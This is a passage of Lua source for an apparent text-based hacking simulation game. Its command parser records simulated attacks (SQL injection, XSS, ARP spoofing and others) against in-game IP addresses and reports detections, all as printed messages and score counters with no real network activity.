              if ((x1==hostip1 and x2==hostip2 and x3==hostip3 and x4==hostip4) or (x1==hostip5 and x2==hostip6 and x3==hostip7 and x4==hostip8) or (x1==hostip9 and x2==hostip10 and x3==hostip11 and x4==hostip12) or (x1==hostip13 and x2==hostip14 and x3==hostip15 and x4==hostip16) or (x1==hostip17 and x2==hostip18 and x3==hostip19 and x4==hostip20) or (x1==hostip21 and x2==hostip22 and x3==hostip23 and x4==hostip24)) and digdi==0 then
              a = a + 1
            genmal = genmal + math.random(300,1000)
                             gen = gen + math.random(600,1500) 
  genmalc = genmal
            end
            
            else
                io.write("Wrong parameters were entered")
               end
            
            else
              io.write("You have not specified a destination for remote bufferoverflow attack.")  
            end
    
     elseif words[2]=="RFI" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A remote file inclusion attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
              zrfi = zrfi + 1
             b1 = words[3]
              b2 = words[4]
              b3 = words[5]
              b4 = words[6]
              
              if ((b1==hostip1 and b2==hostip2 and b3==hostip3 and b4==hostip4) or (b1==hostip5 and b2==hostip6 and b3==hostip7 and b4==hostip8) or (b1==hostip9 and b2==hostip10 and b3==hostip11 and b4==hostip12) or (b1==hostip13 and b2==hostip14 and b3==hostip15 and b4==hostip16) or (b1==hostip17 and b2==hostip18 and b3==hostip19 and b4==hostip20) or (b1==hostip21 and b2==hostip22 and b3==hostip23 and b4==hostip24)) and digdi==0 then
              b = b + 1
            genmal = genmal + math.random(200,1000) 
                             gen = gen + math.random(600,1500) 
 genmald = genmal
             end
             else
                io.write("Wrong parameters were entered")
               end
             
            else
              io.write("You have not specified a destination for RFI attack.")  
            end
    
    
    elseif words[2]=="SQL" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("An SQL injection attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
              zsql = zsql + 1
    c1 = words[3]
              c2 = words[4]
              c3 = words[5]
              c4 = words[6]
              
              if ((c1==hostip1 and c2==hostip2 and c3==hostip3 and c4==hostip4) or (c1==hostip5 and c2==hostip6 and c3==hostip7 and c4==hostip8) or (c1==hostip9 and c2==hostip10 and c3==hostip11 and c4==hostip12) or (c1==hostip13 and c2==hostip14 and c3==hostip15 and c4==hostip16) or (c1==hostip17 and c2==hostip18 and c3==hostip19 and c4==hostip20) or (c1==hostip21 and c2==hostip22 and c3==hostip23 and c4==hostip24)) and digdi==0 then
              c = c + 1
                 genmal = genmal + math.random(200,1000) 
                                  gen = gen + math.random(600,1500) 
 genmale = genmal
           end
           
           else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for SQL injection attack.")  
            end
    
    elseif words[2]=="CSRF" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A cross-site request forgery attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
             zcsrf = zcsrf + 1
    d1 = words[3]
              d2 = words[4]
              d3 = words[5]
              d4 = words[6]
              
              if ((d1==hostip1 and d2==hostip2 and d3==hostip3 and d4==hostip4) or (d1==hostip5 and d2==hostip6 and d3==hostip7 and d4==hostip8) or (d1==hostip9 and d2==hostip10 and d3==hostip11 and d4==hostip12) or (d1==hostip13 and d2==hostip14 and d3==hostip15 and d4==hostip16) or (d1==hostip17 and d2==hostip18 and d3==hostip19 and d4==hostip20) or (d1==hostip21 and d2==hostip22 and d3==hostip23 and d4==hostip24)) and digdi==0 then
              d = d + 1
                 genmal = genmal + math.random(200,3000) 
                                  gen = gen + math.random(600,1500) 
 genmalf = genmal
               end
               
               
               else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for SQL ross-site request forgery attack.")  
            end
    
    elseif words[2]=="XSS" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A cross-site scripting attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
              
              zxss = zxss + 1
      e1 = words[3]
              e2 = words[4]
              e3 = words[5]
              e4 = words[6]
              
              if ((e1==hostip1 and e2==hostip2 and e3==hostip3 and e4==hostip4) or (e1==hostip5 and e2==hostip6 and e3==hostip7 and e4==hostip8) or (e1==hostip9 and e2==hostip10 and e3==hostip11 and e4==hostip12) or (e1==hostip13 and e2==hostip14 and e3==hostip15 and e4==hostip16) or (e1==hostip17 and e2==hostip18 and e3==hostip19 and e4==hostip20) or (e1==hostip21 and e2==hostip22 and e3==hostip23 and e4==hostip24)) and digdi==0 then
              e = e + 1
                genmal = genmal + math.random(200,5000) 
                                 gen = gen + math.random(600,1500) 
 genmalg = genmal
               end

else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for cross-site scripting attack.")  
            end
    
    elseif words[2]=="ARP" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("An ARP spoofing on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
             zarp = zarp + 1
    f1 = words[3]
              f2 = words[4]
              f3 = words[5]
              f4 = words[6]
              
              if ((f1==hostip1 and f2==hostip2 and f3==hostip3 and f4==hostip4) or (f1==hostip5 and f2==hostip6 and f3==hostip7 and f4==hostip8) or (f1==hostip9 and f2==hostip10 and f3==hostip11 and f4==hostip12) or (f1==hostip13 and f2==hostip14 and f3==hostip15 and f4==hostip16) or (f1==hostip17 and f2==hostip18 and f3==hostip19 and f4==hostip20) or (f1==hostip21 and f2==hostip22 and f3==hostip23 and f4==hostip24)) and digdi==0 then
              f = f + 1
         genmal = genmal + math.random(200,2000) 
                          gen = gen + math.random(600,1500) 
 genmalh = genmal
            end
            
            else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for ARP spoofing attack.")  
            end
            
            
      elseif words[2]=="MALWARE" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A malware attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
    g1 = words[3]
              g2 = words[4]
              g3 = words[5]
              g4 = words[6]
              
               if ((g1==hostip1 and g2==hostip2 and g3==hostip3 and g4==hostip4) or (g1==hostip5 and g2==hostip6 and g3==hostip7 and g4==hostip8) or (g1==hostip9 and g2==hostip10 and g3==hostip11 and g4==hostip12) or (g1==hostip13 and g2==hostip14 and g3==hostip15 and g4==hostip16) or (b1==hostip17 and g2==hostip18 and g3==hostip19 and g4==hostip20) or (g1==hostip21 and g2==hostip22 and g3==hostip23 and g4==hostip24)) and digdi==0 then
              pk = pk + 1
              genmal = genmal + math.random(500,5000) 
                               gen = gen + math.random(600,1500) 
 genmalp = genmal
              end
              else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for malware attack.")  
            end
            
            elseif words[2]=="BRUTE" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A brute-force attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
    jk1 = words[3]
              jk2 = words[4]
              jk3 = words[5]
              jk4 = words[6]
              
              if ((jk1==hostip1 and jk2==hostip2 and jk3==hostip3 and jk4==hostip4) or (jk1==hostip5 and jk2==hostip6 and jk3==hostip7 and jk4==hostip8) or (jk1==hostip9 and jk2==hostip10 and jk3==hostip11 and jk4==hostip12) or (jk1==hostip13 and jk2==hostip14 and jk3==hostip15 and jk4==hostip16) or (jk1==hostip17 and jk2==hostip18 and jk3==hostip19 and jk4==hostip20) or (jk1==hostip21 and jk2==hostip22 and jk3==hostip23 and jk4==hostip24)) and digdi==0 then
              jk = jk + 1
            genmal = genmal + math.random(2000,10000) 
                             gen = gen + math.random(600,1500) 
 genmaln = genmal
               end
               else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for brute-force attack.")  
            end
            
            elseif words[2]=="DIRTRAV" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A directory traversal attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
    trav1 = words[3]
              trav2 = words[4]
              trav3 = words[5]
              trav4 = words[6]
              
              if ((trav1==hostip1 and trav2==hostip2 and trav3==hostip3 and ldap4==hostip4) or (trav1==hostip5 and trav2==hostip6 and trav3==hostip7 and trav4==hostip8) or (trav1==hostip9 and trav2==hostip10 and trav3==hostip11 and trav4==hostip12) or (trav1==hostip13 and trav2==hostip14 and trav3==hostip15 and trav4==hostip16) or (trav1==hostip17 and trav2==hostip18 and trav3==hostip19 and trav4==hostip20) or (trav1==hostip21 and trav2==hostip22 and trav3==hostip23 and trav4==hostip24)) and digdi==0 then 
              trav = trav + 1
              genmal = genmal + math.random(500,5000) 
                               gen = gen + math.random(600,1500) 
 genmall = genmal
            end
            
            else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for directory traversal attack.")  
            end
            
            elseif words[2]=="PROBE" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A network probe attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
    uinx1 = words[3]
              uinx2 = words[4]
              uinx3 = words[5]
              uinx4 = words[6]
              
              if ((uinx1==hostip1 and uinx2==hostip2 and uinx3==hostip3 and uinx4==hostip4) or (uinx1==hostip5 and uinx2==hostip6 and uinx3==hostip7 and uinx4==hostip8) or (uinx1==hostip9 and uinx2==hostip10 and uinx3==hostip11 and uinx4==hostip12) or (uinx1==hostip13 and uinx2==hostip14 and uinx3==hostip15 and uinx4==hostip16) or (uinx1==hostip17 and uinx2==hostip18 and uinx3==hostip19 and uinx4==hostip20) or (uinx1==hostip21 and uinx2==hostip22 and uinx3==hostip23 and uinx4==hostip24)) and digdi==0 then
              probe = probe + 1
            genmal = genmal + math.random(2000,10000) 
                             gen = gen + math.random(600,1500) 
 genmaln = genmal
               end
               else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for network probe attack.")  
            end
            
            
             elseif words[2]=="MASQUERADE" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A masquerade attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
    ainz2 = words[3]
              ainz3 = words[4]
              ainz4 = words[5]
              ainz5 = words[6]
              
              if ((ainz2==hostip1 and ainz3==hostip2 and ainz4==hostip3 and ainz5==hostip4) or (ainz2==hostip5 and ainz3==hostip6 and ainz4==hostip7 and ainz5==hostip8) or (ainz2==hostip9 and ainz3==hostip10 and ainz4==hostip11 and ainz5==hostip12) or (ainz2==hostip13 and ainz3==hostip14 and ainz4==hostip15 and ainz5==hostip16) or (ainz2==hostip17 and ainz3==hostip18 and ainz4==hostip19 and ainz5==hostip20) or (ainz2==hostip21 and ainz3==hostip22 and ainz4==hostip23 and ainz5==hostip24)) and digdi==0 then
              masq = masq + 1
            genmal = genmal + math.random(2000,10000) 
                             gen = gen + math.random(600,1500) 
 genmaln = genmal
               end
               else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for masquerade attack.")  
            end
            
            elseif words[2]=="HIJACK" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A session hijacking attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             
    hij1 = words[3]
              hij2 = words[4]
              hij3 = words[5]
              hij4 = words[6]
              
              if ((hij1==hostip1 and hij2==hostip2 and hij3==hostip3 and hij4==hostip4) or (hij1==hostip5 and hij2==hostip6 and hij3==hostip7 and hij4==hostip8) or (hij1==hostip9 and hij2==hostip10 and hij3==hostip11 and hij4==hostip12) or (hij1==hostip13 and hij2==hostip14 and hij3==hostip15 and hij4==hostip16) or (hij1==hostip17 and hij2==hostip18 and hij3==hostip19 and hij4==hostip20) or (hij1==hostip21 and hij2==hostip22 and hij3==hostip23 and hij4==hostip24)) and digdi==0 then
              hij = hij + 1
            genmal = genmal + math.random(2000,10000) 
                             gen = gen + math.random(600,1500) 
 genmaln = genmal
               end
               else
                io.write("Wrong parameters were entered")
               end
            else
              io.write("You have not specified a destination for session hijacking attack.")  
            end
            
        
            
    else 
      io.write("Specify a type of attack and destination.")  
    end
    
    else
       io.write("No attacker's host has been set")
     end

elseif words[1]=="INCLUDE" or words[1]=="include" then
   if words[2]=="ruleset" or words[2]=="RULESET" then
      
            io.write("Ruleset has been added for detection") 
               
          transdata = transdata + 20 

        
    elseif words[2]=="config" or words[2]=="CONFIG" then
       
         
            io.write("Configuration settings have been adjusted successfully for detection")
            transdatab = transdatab + 50     
         else
                                
           io.write("You have not entered a ruleset or a configuration set.")     

         end
       
      
   

elseif words[1]=="SEND" or words[1]=="send" then
    if words[2] == "TCP" or words[2] == "UDP" or words[2] == "SYN" or words[2] == "FIN" or words[2] == "ACK" or words[2] == "RST" then
     if words[3] and tonumber(words[3]) then
         if words[4] and words[5] and words[6] and words[7] then
            io.write(words[3] .. " "  .. words[2] .. " normal packets have been sent to " .. words[4]  .. "." .. words[5]  .. "." .. words[6]  .. "." .. words[7] .. " successfully")    
            
          painip1=words[4]
          painip2=words[5]
          painip3=words[6]
          painip4=words[7]
          if ((painip1==hostip1 and painip2==hostip2 and painip3==hostip3 and painip4==hostip4) or (painip1==hostip5 and painip2==hostip6 and painip3==hostip7 and painip4==hostip8) or (painip1==hostip9 and painip2==hostip10 and painip3==hostip11 and painip4==hostip12) or (painip1==hostip13 and painip2==hostip14 and painip3==hostip15 and painip4==hostip16) or (painip1==hostip17 and painip2==hostip18 and painip3==hostip19 and painip4==hostip20) or (painip1==hostip21 and painip2==hostip22 and painip3==hostip23 and painip4==hostip24)) then
          
          yp = yp + words[3]
          end
          end 
          
          end
     elseif words[2] == "MALF" then
          if words[3] and tonumber(words[3]) then
            if words[4] and words[5] and words[6] and words[7] then
            io.write(words[3] .. " malformed packets have been sent to " .. words[4]  .. "." .. words[5]  .. "." .. words[6]  .. "." .. words[7] .. " successfully")    
          
    
          painip1=words[4]
          painip2=words[5]
          painip3=words[6]
          painip4=words[7]
          if ((painip1==hostip1 and painip2==hostip2 and painip3==hostip3 and painip4==hostip4) or (painip1==hostip5 and painip2==hostip6 and painip3==hostip7 and painip4==hostip8) or (painip1==hostip9 and painip2==hostip10 and painip3==hostip11 and painip4==hostip12) or (painip1==hostip13 and painip2==hostip14 and painip3==hostip15 and painip4==hostip16) or (painip1==hostip17 and painip2==hostip18 and painip3==hostip19 and painip4==hostip20) or (painip1==hostip21 and painip2==hostip22 and painip3==hostip23 and painip4==hostip24)) then
             ym = ym + words[3]
             end
            end
            end
     else
          io.write("You have not entered an integer at the second parameter or this does not exist.")     
     end
     
    
    
    
elseif words[1]=="REPEAT" or words[1]=="repeat" then

if paxname>=10 then
    if words[2]=="DOS" or words[2]=="dos" then  
      if zdos >= 1 then     
        io.write("A denial-of-service attack on " .. p1 .. "." .. p2 .. "." .. p3 .. "." .. p4 .. " was made again successfully") 
        if ((p1==hostip1 and p2==hostip2 and p3==hostip3 and p4==hostip4) or (p1==hostip5 and p2==hostip6 and p3==hostip7 and p4==hostip8) or (p1==hostip9 and p2==hostip10 and p3==hostip11 and p4==hostip12) or (p1==hostip13 and p2==hostip14 and p3==hostip15 and p4==hostip16) or (p1==hostip17 and p2==hostip18 and p3==hostip19 and p4==hostip20) or (p1==hostip21 and p2==hostip22 and p3==hostip23 and p4==hostip24)) and digdi==0 then
       
          z = z + 1
              genmal = genmal + math.random(8000,10000)
              gen = gen + math.random(600,150000) 
              genmala = genmal
              
            else
              zdos = zdos + 1
            end
     else 
                 io.write("No DOS-attack was made previously.")     

     end
     
    
    
    elseif words[2]=="SHELL" or words[2]=="shell" then  
      if zshell >= 1 then     
        io.write("A shellcode execution on " .. m1 .. "." .. m2 .. "." .. m3 .. "." .. m4 .. " was made again successfully") 
         if ((m1==hostip1 and m2==hostip2 and m3==hostip3 and m4==hostip4) or (m1==hostip5 and m2==hostip6 and m3==hostip7 and m4==hostip8) or (m1==hostip9 and m2==hostip10 and m3==hostip11 and m4==hostip12) or (m1==hostip13 and m2==hostip14 and m3==hostip15 and m4==hostip16) or (m1==hostip17 and m2==hostip18 and m3==hostip19 and m4==hostip20) or (m1==hostip21 and m2==hostip22 and m3==hostip23 and m4==hostip24)) and digdi==0   then
          m = m + 1
             genmal = genmal + math.random(800,1000) 
                 gen = gen + math.random(600,1500) 
      genmalb = genmal
        else
          zshell = zshell + 1
        end
        
     else 
                 io.write("No shellcode execution was made previously.")     

     end
    
    
    elseif words[2]=="REMBUFF" or words[2]=="rembuff" then  
      if zbuff >= 1 then     
      io.write("A remote bufferoverflow attack on " .. x1 .. "." .. x2 .. "." .. x3 .. "." .. x4 .. " was made again successfully") 
      if ((x1==hostip1 and x2==hostip2 and x3==hostip3 and x4==hostip4) or (x1==hostip5 and x2==hostip6 and x3==hostip7 and x4==hostip8) or (x1==hostip9 and x2==hostip10 and x3==hostip11 and x4==hostip12) or (x1==hostip13 and x2==hostip14 and x3==hostip15 and x4==hostip16) or (x1==hostip17 and x2==hostip18 and x3==hostip19 and x4==hostip20) or (x1==hostip21 and x2==hostip22 and x3==hostip23 and x4==hostip24)) and digdi==0 then
        
         a = a + 1
            genmal = genmal + math.random(300,1000)
                             gen = gen + math.random(600,1500) 
  genmalc = genmal
      else
         zbuff = zbuff + 1
      end
  
     else 
                 io.write("No remote bufferoverflow attack was made previously.")     

     end
   
    
    elseif words[2]=="RFI" or words[2]=="rfi" then  
      if zrfi >= 1 then     
        io.write("A remote file inclusion attack on " .. b1 .. "." .. b2 .. "." .. b3 .. "." .. b4 .. " was made again successfully") 
        
        if ((b1==hostip1 and b2==hostip2 and b3==hostip3 and b4==hostip4) or (b1==hostip5 and b2==hostip6 and b3==hostip7 and b4==hostip8) or (b1==hostip9 and b2==hostip10 and b3==hostip11 and b4==hostip12) or (b1==hostip13 and b2==hostip14 and b3==hostip15 and b4==hostip16) or (b1==hostip17 and b2==hostip18 and b3==hostip19 and b4==hostip20) or (b1==hostip21 and b2==hostip22 and b3==hostip23 and b4==hostip24)) and digdi==0 then
         b = b + 1
            genmal = genmal + math.random(200,1000) 
                             gen = gen + math.random(600,1500) 
 genmald = genmal
       else
     zrfi = zrfi + 1
       end
     else 
                 io.write("No remote file inclusion attack was made previously.")     

     end
    
    
    elseif words[2]=="SQL" or words[2]=="sql" then  
      if zsql >= 1 then     
        io.write("An SQL injection attack on " .. c1 .. "." .. c2 .. "." .. c3 .. "." .. c4 .. " was made again successfully") 
         if ((c1==hostip1 and c2==hostip2 and c3==hostip3 and c4==hostip4) or (c1==hostip5 and c2==hostip6 and c3==hostip7 and c4==hostip8) or (c1==hostip9 and c2==hostip10 and c3==hostip11 and c4==hostip12) or (c1==hostip13 and c2==hostip14 and c3==hostip15 and c4==hostip16) or (c1==hostip17 and c2==hostip18 and c3==hostip19 and c4==hostip20) or (c1==hostip21 and c2==hostip22 and c3==hostip23 and c4==hostip24)) and digdi==0 then
         c = c + 1
                 genmal = genmal + math.random(200,1000) 
                                  gen = gen + math.random(600,1500) 
 genmale = genmal
 else
   zsql = zsql + 1
 end
     else 
                 io.write("No SQL-attack was made previously.")     

     end
    
    
    elseif words[2]=="XSS" or words[2]=="xss" then  
      if zxss >= 1 then     
        io.write("A cross-site scripting attack on " .. e1 .. "." .. e2 .. "." .. e3 .. "." .. e4 .. " was made again successfully") 
         if ((e1==hostip1 and e2==hostip2 and e3==hostip3 and e4==hostip4) or (e1==hostip5 and e2==hostip6 and e3==hostip7 and e4==hostip8) or (e1==hostip9 and e2==hostip10 and e3==hostip11 and e4==hostip12) or (e1==hostip13 and e2==hostip14 and e3==hostip15 and e4==hostip16) or (e1==hostip17 and e2==hostip18 and e3==hostip19 and e4==hostip20) or (e1==hostip21 and e2==hostip22 and e3==hostip23 and e4==hostip24)) and digdi==0 then
                e = e + 1
                genmal = genmal + math.random(200,5000) 
                                 gen = gen + math.random(600,1500) 
              genmalg = genmal
              
    else
       zxss = zxss + 1
    end
     else 
                 io.write("No cross-site scripting attack was made previously.")     

     end
    
    
    elseif words[2]=="CSRF" or words[2]=="csrf" then  
      if zcsrf >= 1 then     
        io.write("A cross-site request forgery attack on " .. d1 .. "." .. d2 .. "." .. d3 .. "." .. d4 .. " was made again successfully") 
        if ((d1==hostip1 and d2==hostip2 and d3==hostip3 and d4==hostip4) or (d1==hostip5 and d2==hostip6 and d3==hostip7 and d4==hostip8) or (d1==hostip9 and d2==hostip10 and d3==hostip11 and d4==hostip12) or (d1==hostip13 and d2==hostip14 and d3==hostip15 and d4==hostip16) or (d1==hostip17 and d2==hostip18 and d3==hostip19 and d4==hostip20) or (d1==hostip21 and d2==hostip22 and d3==hostip23 and d4==hostip24)) and digdi==0 then
        d = d + 1
                 genmal = genmal + math.random(200,3000) 
                                  gen = gen + math.random(600,1500) 
 genmalf = genmal
 else
   zcsrf = zcsrf + 1
 end
     else 
                 io.write("No CSRF-attack was made previously.")     

     end
    
    
    elseif words[2]=="ARP" or words[2]=="arp" then  
      if zarp >= 1 then     
        io.write("An ARP spoofing attack on " .. f1 .. "." .. f2 .. "." .. f3 .. "." .. f4 .. " has been made again successfully") 
        if ((f1==hostip1 and f2==hostip2 and f3==hostip3 and f4==hostip4) or (f1==hostip5 and f2==hostip6 and f3==hostip7 and f4==hostip8) or (f1==hostip9 and f2==hostip10 and f3==hostip11 and f4==hostip12) or (f1==hostip13 and f2==hostip14 and f3==hostip15 and f4==hostip16) or (f1==hostip17 and f2==hostip18 and f3==hostip19 and f4==hostip20) or (f1==hostip21 and f2==hostip22 and f3==hostip23 and f4==hostip24)) and digdi==0 then
         f = f + 1
         genmal = genmal + math.random(200,2000) 
                          gen = gen + math.random(600,1500) 
 genmalh = genmal
 else
   zarp = zarp + 1
 end
     else 
                 io.write("No ARP spoofing attack was made previously.")     

     end
     else
       io.write("Wrong parameters were entered")
     
    end

else
   io.write("No attacker's host has been set")  
end
    
elseif words[1]=="DETECT" or words[1]=="detect" then    
   if iodetect==0 then     
        if words[2]=="DOS" then
          if transdata>=20 and transdatab>=50 and transdatax>=500 and ((p1==hostip1 and p2==hostip2 and p3==hostip3 and p4==hostip4) or (p1==hostip5 and p2==hostip6 and p3==hostip7 and p4==hostip8) or (p1==hostip9 and p2==hostip10 and p3==hostip11 and p4==hostip12) or (p1==hostip13 and p2==hostip14 and p3==hostip15 and p4==hostip16) or (p1==hostip17 and p2==hostip18 and p3==hostip19 and p4==hostip20) or (p1==hostip21 and p2==hostip22 and p3==hostip23 and p4==hostip24)) then
            if z == 1 then
               io.write(z .. " DOS-attack has been detected and it was made to " .. p1 .. "." .. p2 ..  "." .. p3 .. "." .. p4) 
            elseif z > 1 then
                io.write(z .. " DOS-attacks have been detected and the last was made to " .. p1 .. "." .. p2 ..  "." .. p3 .. "." .. p4) 
            else
          io.write("No Denial of Service attacks were detected.")
            end
          else
          io.write("No Denial of Service attacks were detected.")
        end
        end
        
         if words[2]=="XSS" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((e1==hostip1 and e2==hostip2 and e3==hostip3 and e4==hostip4) or (e1==hostip5 and e2==hostip6 and e3==hostip7 and e4==hostip8) or (e1==hostip9 and e2==hostip10 and e3==hostip11 and e4==hostip12) or (e1==hostip13 and e2==hostip14 and e3==hostip15 and e4==hostip16) or (e1==hostip17 and e2==hostip18 and e3==hostip19 and e4==hostip20) or (e1==hostip21 and e2==hostip22 and e3==hostip23 and e4==hostip24)) then
            if e == 1 then
               
               io.write(e .. " XSS-attack has been detected and it was made to " .. e1 .. "." .. e2 ..  "." .. e3 .. "." .. e4) 
            elseif e > 1 then
                io.write(e .. " XSS-attacks have been detected and the last was made to " .. e1 .. "." .. e2 ..  "." .. e3 .. "." .. e4) 
           else
                     io.write("No Cross-site scripting attacks were detected.")

           
            end
            else
          io.write("No Cross-site scripting attacks were detected.")
        end
        end
        
         if words[2]=="SQL" then
         if transdata>=20 and transdatab>=50 and transdatax>=500 and ((c1==hostip1 and c2==hostip2 and c3==hostip3 and c4==hostip4) or (c1==hostip5 and c2==hostip6 and c3==hostip7 and c4==hostip8) or (c1==hostip9 and c2==hostip10 and c3==hostip11 and c4==hostip12) or (c1==hostip13 and c2==hostip14 and c3==hostip15 and c4==hostip16) or (c1==hostip17 and c2==hostip18 and c3==hostip19 and c4==hostip20) or (c1==hostip21 and c2==hostip22 and c3==hostip23 and c4==hostip24)) then
            if c == 1 then
               io.write(c .. " SQL-attack has been detected and it was made to " .. c1 .. "." .. c2 ..  "." .. c3 .. "." .. c4) 
            elseif c > 1 then
                io.write(c .. " SQL-attacks have been detected and the last was made to " .. c1 .. "." .. c2 ..  "." .. c3 .. "." .. c4) 
            else
                      io.write("No SQL Injections were detected.")

            
            end
           else
          io.write("No SQL Injections were detected.")
        end
        end
        
         if words[2]=="RFI" then
           
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((b1==hostip1 and b2==hostip2 and b3==hostip3 and b4==hostip4) or (b1==hostip5 and b2==hostip6 and b3==hostip7 and b4==hostip8) or (b1==hostip9 and b2==hostip10 and b3==hostip11 and b4==hostip12) or (b1==hostip13 and b2==hostip14 and b3==hostip15 and b4==hostip16) or (b1==hostip17 and b2==hostip18 and b3==hostip19 and b4==hostip20) or (b1==hostip21 and b2==hostip22 and b3==hostip23 and b4==hostip24)) then
            if b == 1 then
               io.write(b .. " RFI-attack has been detected and it was made to " .. b1 .. "." .. b2 ..  "." .. b3 .. "." .. b4) 
            elseif b > 1 then
                io.write(b .. " RFI-attacks have been detected and the last was made to " .. b1 .. "." .. b2 ..  "." .. b3 .. "." .. b4) 
            else
                          io.write("No RFI-attacks were detected.")

            
            end
            else
              io.write("No RFI-attacks were detected.")
            end
        end
        
         if words[2]=="SHELL" then
         if transdata>=20 and transdatab>=50 and transdatax>=500 and ((m1==hostip1 and m2==hostip2 and m3==hostip3 and m4==hostip4) or (m1==hostip5 and m2==hostip6 and m3==hostip7 and m4==hostip8) or (m1==hostip9 and m2==hostip10 and m3==hostip11 and m4==hostip12) or (m1==hostip13 and m2==hostip14 and m3==hostip15 and m4==hostip16) or (m1==hostip17 and m2==hostip18 and m3==hostip19 and m4==hostip20) or (m1==hostip21 and m2==hostip22 and m3==hostip23 and m4==hostip24))   then
            if m == 1 then
               io.write(m .. " shellcode execution has been detected and it was made to " .. m1 .. "." .. m2 ..  "." .. m3 .. "." .. m4) 
            elseif m > 1 then
                io.write(m .. " shellcode executions have been detected and the last was made to " .. m1 .. "." .. m2 ..  "." .. m3 .. "." .. m4) 
            else
            
                      io.write("No shellcode executions were detected.")

            end
             else
          io.write("No shellcode executions were detected.")
        end
        end
        
         if words[2]=="REMBUFF" then
         if transdata>=20 and transdatab>=50 and transdatax>=500 and ((x1==hostip1 and x2==hostip2 and x3==hostip3 and x4==hostip4) or (x1==hostip5 and x2==hostip6 and x3==hostip7 and x4==hostip8) or (x1==hostip9 and x2==hostip10 and x3==hostip11 and x4==hostip12) or (x1==hostip13 and x2==hostip14 and x3==hostip15 and x4==hostip16) or (x1==hostip17 and x2==hostip18 and x3==hostip19 and x4==hostip20) or (x1==hostip21 and x2==hostip22 and x3==hostip23 and x4==hostip24)) then
            if a == 1 then
               io.write(a .. " remote bufferoverflow attack has been detected and it was made to " .. x1 .. "." .. x2 ..  "." .. x3 .. "." .. x4) 
            elseif a > 1 then
                io.write(a .. " remote bufferoverflow attacks have been detected and the last was made to " .. x1 .. "." .. x2 ..  "." .. x3 .. "." .. x4) 
           else
                        io.write("No remote bufferoverflows were detected.")

            end
            else
             io.write("No remote bufferoverflows were detected.")
            end
        end
                 if words[2]=="BRUTE" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((jk1==hostip1 and jk2==hostip2 and jk3==hostip3 and jk4==hostip4) or (jk1==hostip5 and jk2==hostip6 and jk3==hostip7 and jk4==hostip8) or (jk1==hostip9 and jk2==hostip10 and jk3==hostip11 and jk4==hostip12) or (jk1==hostip13 and jk2==hostip14 and jk3==hostip15 and jk4==hostip16) or (jk1==hostip17 and jk2==hostip18 and jk3==hostip19 and jk4==hostip20) or (jk1==hostip21 and jk2==hostip22 and jk3==hostip23 and jk4==hostip24)) then
            if jk == 1 then
               io.write(jk .. " brute-force attack has been detected and it was made to " .. jk1 .. "." .. jk2 ..  "." .. jk3 .. "." .. jk4) 
            elseif jk > 1 then
                io.write(jk .. " brute-force attacks have been detected and the last was made to " .. jk1 .. "." .. jk2 ..  "." .. jk3 .. "." .. jk4) 
             else
                       io.write("No brute-force attacks were detected.")

             end
          else
          io.write("No brute-force attacks were detected.")
            end
        end
         if words[2]=="MALWARE" then
